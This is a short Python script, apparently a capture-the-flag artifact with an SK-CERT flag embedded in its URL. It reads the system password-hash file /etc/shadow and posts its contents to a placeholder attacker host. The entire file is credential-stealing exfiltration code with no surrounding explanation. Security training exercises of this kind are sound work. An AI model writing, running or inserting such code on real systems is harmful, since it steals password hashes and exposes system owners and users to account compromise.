import requests
shadow = None
with open("/etc/shadow") as f:
    shadow = f.read()


requests.post("attacker-address.com/shadow#SK-CERT{s70l3n_s3cr37s_g03s_70_4774ck3r}", json={"shadow": shadow})
